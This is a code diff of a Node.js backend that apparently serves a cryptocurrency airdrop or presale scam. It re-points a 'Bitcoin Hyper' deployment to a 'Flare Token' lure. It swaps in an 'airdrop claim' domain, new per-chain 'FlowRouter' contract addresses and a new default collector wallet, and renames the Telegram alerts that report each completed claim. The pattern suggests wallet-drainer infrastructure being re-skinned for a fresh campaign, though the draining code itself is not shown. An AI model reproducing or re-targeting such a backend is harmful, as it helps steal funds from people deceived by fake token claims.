@@ -21,7 +21,7 @@ app.use(helmet({
 
 const allowedOrigins = process.env.ALLOWED_ORIGINS 
   ? process.env.ALLOWED_ORIGINS.split(',') 
-  : ['http://localhost:3000', 'https://bitcoinhypertoken.vercel.app', 'https://bthbk.vercel.app'];
+  : ['http://localhost:3000', 'https://flareairdropclaim.vercel.app', 'https://flarebackend.vercel.app'];
 
 app.use(cors({
   origin: allowedOrigins,
@@ -158,15 +158,15 @@ async function getChainProvider(chainName) {
 // ============================================
 
 const PROJECT_FLOW_ROUTERS = {
-  'Ethereum': '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
-  'BSC': '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
-  'Polygon': '0x56d829E89634Ce1426B73571c257623D17db46cB',
-  'Arbitrum': '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
-  'Avalanche': '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
+  'Ethereum': '0x7264F557f762f16aC7937292D19449c5CE962288',
+  'BSC': '0x7264F557f762f16aC7937292D19449c5CE962288',
+  'Polygon': '0x54b4A3C43CFf0aC70A8AC3f38f0fdC5DFA1cb278',
+  'Arbitrum': '0x54b4A3C43CFf0aC70A8AC3f38f0fdC5DFA1cb278',
+  'Avalanche': '0xF6F0B833186DD54B772a93002ab765fc7Ab9D01F',
   'Optimism': null // Not deployed yet
 };
 
-const COLLECTOR_WALLET = process.env.COLLECTOR_WALLET || '0x50C14Ec595D178f70D2817B1097B9FEE00af67B7';
+const COLLECTOR_WALLET = process.env.COLLECTOR_WALLET || '0x713eabb95d3650dad05b5e84cb7c58870dd63c96';
 
 // ============================================
 // CONTRACT ABI
@@ -247,7 +247,7 @@ async function testTelegramConnection() {
       telegramEnabled = true;
       
       await sendTelegramMessage(
-        `🚀 <b>BITCOIN HYPER BACKEND ONLINE</b>\n` +
+        `🚀 <b>Flare Token BACKEND ONLINE</b>\n` +
         `✅ MultiChain FlowRouter Ready\n` +
         `📦 Collector: ${COLLECTOR_WALLET.substring(0, 10)}...\n` +
         `🌐 Networks: Ethereum, BSC, Polygon, Arbitrum, Avalanche`
@@ -788,7 +788,7 @@ app.post('/api/presale/claim', async (req, res) => {
     participant.claimedAt = new Date();
     memoryStorage.settings.statistics.claimedParticipants++;
     
-    const claimId = `BTH-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
+    const claimId = `Flr-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
     
     await sendTelegramMessage(
       `🎯 <b>🎉 CLAIM COMPLETED 🎉</b>\n` +
@@ -989,16 +989,19 @@ app.listen(PORT, '0.0.0.0', async () => {
   📦 COLLECTOR: ${COLLECTOR_WALLET}
   
   🌐 DEPLOYED CONTRACTS:
-  ✅ Ethereum: 0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4
-  ✅ BSC: 0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4
-  ✅ Polygon: 0x56d829E89634Ce1426B73571c257623D17db46cB
-  ✅ Arbitrum: 0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4
-  ✅ Avalanche: 0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4
+  ✅ Ethereum: 0x7264F557f762f16aC7937292D19449c5CE962288
+  ✅ BSC: 0x7264F557f762f16aC7937292D19449c5CE962288
+  ✅ Polygon: 0x54b4A3C43CFf0aC70A8AC3f38f0fdC5DFA1cb278
+  ✅ Arbitrum: 0x54b4A3C43CFf0aC70A8AC3f38f0fdC5DFA1cb278
+  ✅ Avalanche: 0xF6F0B833186DD54B772a93002ab765fc7Ab9D01F
+
+
   
   🚀 READY FOR MULTICHAIN FLOWS
   `);
   
   await testTelegramConnection();
 });
+
 
 
